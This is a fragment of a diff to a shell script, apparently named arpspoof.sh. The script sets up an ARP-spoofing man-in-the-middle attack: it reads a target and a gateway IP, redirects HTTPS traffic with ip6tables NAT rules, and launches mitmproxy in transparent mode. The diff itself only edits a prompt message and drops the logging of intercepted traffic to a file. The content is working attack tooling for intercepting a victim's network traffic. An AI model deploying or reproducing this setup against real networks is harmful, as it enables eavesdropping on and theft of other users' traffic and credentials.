@@ -33,7 +33,7 @@ echo ===========================================================================
 
 # Select Target IP address and Gateway address to start ARP spoofing
 echo
-echo "To begin ARP Spoofing, please provide the TARGET IP and GATEWAY IP addresses"
+echo "To begin ARP Spoofing, please provide the TARGET IP and GATEWAY IP addresses in the arpspoof.sh file"
 echo
 
 read -p "TARGET IP: " Target
@@ -74,5 +74,5 @@ ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 
 # Firewall rules must first be set in order for the attacking machine to allow for traffic to flow uninterupted
 # These same rules can be configured within the linux system to be set permenantely.
 
-mitmproxy --mode transparent --showhost >> /root/tollbooth/mitmproxy_log
+mitmproxy --mode transparent --showhost 
 
